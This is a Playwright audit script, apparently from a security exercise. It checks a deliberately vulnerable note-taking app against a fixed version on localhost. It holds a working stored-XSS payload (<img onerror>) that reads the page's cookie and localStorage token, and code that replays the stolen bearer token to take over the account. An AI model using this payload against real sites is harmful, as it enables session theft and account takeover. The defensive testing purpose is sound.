/**
 * Optional browser check for the XSS / token-storage attack (A15 in a real browser).
 *   1. npm i -D playwright && npx playwright install chromium
 *   2. npm run start:vulnerable        (port 4000, in one terminal)
 *      npm start                       (port 4001 with PORT=4001, in another)
 *   3. node audit/browser-xss.cjs http://localhost:4000 http://localhost:4001
 * It saves a note whose body is an <img onerror> payload, reloads the page, and reports what the script could read.
 */
let chromium;
try { ({ chromium } = require('playwright')); } catch { console.error('Install Playwright first: npm i -D playwright'); process.exit(1); }

const PAYLOAD = `<img src=x onerror="window.__loot = JSON.stringify({cookie: document.cookie, token: localStorage.getItem('token')})">`;

async function probe(base, label) {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const user = 'xss_' + Math.random().toString(36).slice(2, 8), pw = 'correct horse battery staple 42';
  await page.goto(base);
  await page.getByRole('tab', { name: 'Create account' }).click();
  await page.fill('#username', user); await page.fill('#password', pw);
  await page.getByRole('button', { name: 'Create account' }).click();
  await page.getByRole('button', { name: 'New note' }).first().click();
  await page.waitForSelector('#nt');
  await page.fill('#nt', 'payload'); await page.fill('#nb', PAYLOAD);
  await page.getByRole('button', { name: 'Save note' }).click();
  await page.waitForTimeout(500);
  await page.reload(); await page.waitForTimeout(500);
  const loot = await page.evaluate(() => window.__loot ?? null);
  let takeover = 'n/a';
  if (loot) {
    const token = JSON.parse(loot).token;
    if (token) {
      const r = await fetch(base + '/api/me', { headers: { authorization: `Bearer ${token}` } }); // attacker, separate machine, no cookie
      takeover = `attacker request with stolen token -> HTTP ${r.status}`;
    }
  }
  console.log(`${label.padEnd(10)} script ran: ${loot ? 'YES' : 'no'}   loot: ${loot ?? '(nothing)'}   ${takeover}`);
  await browser.close();
}

const [vulnerable = 'http://localhost:4000', secure = 'http://localhost:4001'] = process.argv.slice(2);
(async () => { await probe(vulnerable, 'VULNERABLE'); await probe(secure, 'FIXED'); })();
